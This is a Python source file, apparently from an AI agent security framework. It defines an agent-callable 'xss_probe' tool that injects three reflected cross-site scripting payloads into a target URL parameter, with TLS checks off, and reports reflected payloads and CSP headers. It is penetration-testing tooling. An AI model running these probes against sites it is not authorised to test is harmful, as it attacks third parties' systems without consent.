from __future__ import annotations

import json
from typing import Dict, List, Optional
from urllib.parse import urlencode, urlsplit, urlunsplit

import requests

from cai.sdk.agents import function_tool
from cai.tools.web.plugin_registry import ExploitPlugin, REGISTRY


def _inject(url: str, name: str, payload: str) -> str:
    parts = list(urlsplit(url))
    params = {}
    if parts[3]:
        for pair in parts[3].split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k] = v
    params[name] = payload
    parts[3] = urlencode(params)
    return urlunsplit(parts)


@function_tool(strict_mode=False)
def xss_probe(
    target_url: str,
    parameter_name: str = "q",
    headers: Optional[Dict[str, str]] = None,
) -> str:
    payloads = [
        "<svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
    ]
    hits: List[Dict[str, str]] = []
    for payload in payloads:
        probe_url = _inject(target_url, parameter_name, payload)
        try:
            resp = requests.get(probe_url, headers=headers or {}, timeout=10, verify=False)
            body = resp.text[:5000] if resp.text else ""
            reflected = payload in body
            csp = resp.headers.get("Content-Security-Policy", "")
            if reflected:
                hits.append(
                    {
                        "payload": payload,
                        "url": probe_url,
                        "status_code": str(resp.status_code),
                        "csp": csp,
                    }
                )
        except Exception as exc:  # pylint: disable=broad-except
            hits.append({"payload": payload, "url": probe_url, "error": str(exc)})

    output = {
        "target_url": target_url,
        "parameter_name": parameter_name,
        "candidate_hits": hits,
        "confidence": "high" if hits else "low",
    }
    return json.dumps(output, ensure_ascii=True)


REGISTRY.register(
    ExploitPlugin(
        name="xss_probe",
        category="xss",
        execute=xss_probe,
        description="Reflected XSS payload probe with CSP context.",
    )
)
